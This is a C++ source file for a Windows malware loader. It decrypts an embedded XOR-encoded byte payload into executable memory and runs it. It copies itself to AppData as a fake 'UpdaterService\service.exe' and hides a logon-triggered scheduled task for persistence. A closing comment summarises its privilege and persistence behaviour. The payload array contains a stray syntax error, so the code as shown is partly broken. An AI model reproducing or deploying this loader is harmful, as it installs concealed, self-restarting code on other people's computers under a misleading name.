#include <windows.h>
#include <shlobj.h>
#include <string>
#include <taskschd.h>
#include <comutil.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

class ModuleLoader {
public:
    static void DecryptAndExecute(unsigned char* payload, unsigned int payloadSize) {
        // Simple XOR decryption
        for (unsigned int i = 0; i < payloadSize; i++) {
            payload[i] ^= 0xDE;
        }

        void* exec = VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, payload, payloadSize);
        ((void(*)())exec)();
    }
};

unsigned char payload[] = {
    0x6b, 0xa9, 0x9d, 0x33, 0x9a, 0x61, 0x49, 0xa8, 0x6c, 0x28, 0xcd, 0x7d, 0x06, 0x6c, 0x0c, 0xec,
    0xb1, 0xee, 0x07, 0x49, 0xcd, 0x6d, 0xd5, 0x81, 0x14, 0x45, 0xdf, 0x99, 0x54, 0x06, 0x17, 0x95,
    0x6c, 0xc7, 0x0f, 0xbc, 0x1e, 0x25, 0x51, 0x60, 0x01, 0x6e, 0x63, 0xf7, 0x76, 0x13, 0x1c, 0x04,
    0x13, 0xcc, 0x36, 0xca, 0x27, 0xb0, 0x6c, 0xae, 0xf7, 0x4a, 0x3d, 0x6c, 0xdf, 0x36, 0x51, 0x5c,
    0xe0, 0xa7, 0xa7, 0x7e, 0x84, 0x64, 0xe6, 0x3c, 0x33, 0xf2, 0x07, 0x65, 0x60, 0xc1, 0x12, 0xf6,
    0xdd, 0x27, 0xbc, 0x65, 0x0b, 0x8e, 0x1c, 0x52, 0x15, 0xc4, 0xb6, 0x22, 0x85, 0xd6, 0xd5, 0x62,
    0xe6, 0x94, 0x6c, 0x06, 0x85, 0xf2, 0xb1, 0xf7, 0xae, 0x29, 0xe8, 0x93, 0x07, 0x6a, 0x47, 0xb2,
    0xa6, 0xc2, 0x1d, 0xac, 0x95, 0xf9, 0x06, 0x13, 0x1c, 0xe1, 0x84, 0x61, 0x7f, 0xd8, 0xb4, 0xc4,
    0x90, 0x43, 0xb5, 0x34, 0xed, 0x25, 0x10, 0x31, 0xdb, 0x22, 0x8f, 0xfa, 0x47, 0x4d, 0xe0, 0xe2,
    0x9e, 0x57, 0x41, 0xcf, 0x65, 0xf0, 0x34, 0x74, 0x9c, 0xdb, 0x6f, 0x7a, 0x9c, 0xe7, 0x52, 0x0f,
    0x55, 0x0f, 0x08, 0xbf, 0x05, 0x59, 0x6b, 0xb7, 0x15, 0x09, 0xcc, 0x6d, 0xee, 0x68, 0xbf, 0x1c,
    0xbd, 0x3f, 0xcf, 0xa5, 0xd7, 0x57, 0x2c, 0x95, 0x1b, 0x22, 0x73, 0xdc, 0x3a, 0xc9, 0x11, 0x4d,
    0xcd, 0xf6, 0x36, 0xcc, 0xf8, 0x01, 0xd6, 0x73, 0x2e, 0xb6, 0x54, 0xec, 0x64, 0xfa, 0x01, 0xf9,
    0x79, 0x41, 0x05, 0x52, 0x86, 0x02, 0xc9, 0x07, 0x27, 0x8d, 0x32, 0xac, 0xf5, 0x7d, 0x82, 0xe8,
    0xfb, 0x61, 0xdc, 0xc4, 0x63, 0x5b, 0x0c, 0xb5, 0x56, 0x95, 0xd7, 0xbd, 0x0d, 0x93, 0x4a, 0xdd,
    0x44, 0xa8, 0x96, 0xc3, 0x20, 0xc6, 0x51, 0x62, 0x27, 0xa4, 0x64, 0x61,.
    0xd5, 0x80, 0xea, 0x64,
    0x9e, 0x79, 0xba, 0x7c, 0xee, 0x79, 0x6f, 0x87, 0xe4, 0xb5, 0x24, 0x81, 0x95, 0x3a, 0x65, 0xd3,
    0xbd, 0x76, 0x40, 0xbc
};

class Persistence {
public:
    static bool RegisterLogonTask(const std::wstring& exePath) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) {
            OutputDebugStringW(L"CoInitializeEx failed");
            return false;
        }

        hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hr)) {
            OutputDebugStringW(L"CoInitializeSecurity failed");
            CoUninitialize();
            return false;
        }

        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
        if (FAILED(hr)) {
            OutputDebugStringW(L"Failed to create TaskService instance");
            CoUninitialize();
            return false;
        }

        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            OutputDebugStringW(L"ITaskService::Connect failed");
            pService->Release();
            CoUninitialize();
            return false;
        }

        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot get root folder");
            pService->Release();
            CoUninitialize();
            return false;
        }

        pRootFolder->DeleteTask(_bstr_t(L"UpdaterServiceTask"), 0);

        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);
        pService->Release();
        if (FAILED(hr)) {
            OutputDebugStringW(L"Failed to create a task definition");
            pRootFolder->Release();
            CoUninitialize();
            return false;
        }

        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot get settings");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_Hidden(VARIANT_TRUE);
        pSettings->Release();

        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot get trigger collection");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        pTriggerCollection->Release();
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot create trigger");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        // TODO: This is where one could swap in an alternate schedule or event-based trigger.
        // For example, to run daily at 8am:
        // hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
        // ITimeTrigger* pTimeTrigger = NULL;
        // hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
        // pTimeTrigger->put_StartBoundary(_bstr_t(L"2023-01-01T08:00:00"));
        // pTimeTrigger->Release();

        ILogonTrigger* pLogonTrigger = NULL;
        hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
        pTrigger->Release();
        if (FAILED(hr)) {
            OutputDebugStringW(L"QueryInterface for ILogonTrigger failed");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger"));
        pLogonTrigger->Release();

        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot get action collection");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        pActionCollection->Release();
        if (FAILED(hr)) {
            OutputDebugStringW(L"Cannot create action");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        IExecAction* pExecAction = NULL;
        hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
        pAction->Release();
        if (FAILED(hr)) {
            OutputDebugStringW(L"QueryInterface for IExecAction failed");
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return false;
        }

        pExecAction->put_Path(_bstr_t(exePath.c_str()));
        pExecAction->Release();

        IRegisteredTask* pRegisteredTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"UpdaterServiceTask"),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L""),
            _variant_t(L""),
            TASK_LOGON_NONE,
            _variant_t(L""),
            &pRegisteredTask);

        pRootFolder->Release();
        pTask->Release();

        if (FAILED(hr)) {
            OutputDebugStringW(L"Error saving the task");
            CoUninitialize();
            return false;
        }

        pRegisteredTask->Release();
        CoUninitialize();
        return true;
    }
};

bool CopySelfToAppData(std::wstring& outDestPath) {
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        return false;
    }

    wchar_t appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return false;
    }

    wchar_t destDir[MAX_PATH];
    swprintf_s(destDir, MAX_PATH, L"%s\\UpdaterService", appDataPath);

    if (CreateDirectoryW(destDir, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        wchar_t destPath[MAX_PATH];
        swprintf_s(destPath, MAX_PATH, L"%s\\service.exe", destDir);
        if (CopyFileW(currentPath, destPath, FALSE)) {
            outDestPath = destPath;
            return true;
        }
    }

    return false;
}

int wmain() {
    std::wstring destPath;
    if (CopySelfToAppData(destPath)) {
        Persistence::RegisterLogonTask(destPath);
    }

    ModuleLoader::DecryptAndExecute(payload, sizeof(payload));

    return 0;
}

/*
 * UAC Elevation:
 * This application does not explicitly request UAC elevation. However, if the user
 * running this application is a member of the Administrators group, the application
 * will run with elevated privileges. This is because the application manifest is not
 * embedded in the executable, and therefore, the default behavior is to run with
 * the same privileges as the user who launched it.
 *
 * Scheduled Task Registration:
 * The function that registers the scheduled task is `Persistence::RegisterLogonTask`.
 * This function uses the Task Scheduler COM API to create a new task that runs at
 * user logon.
 *
 * Registry "Run" Keys:
 * This application does not use any registry "Run" keys for persistence.
 */
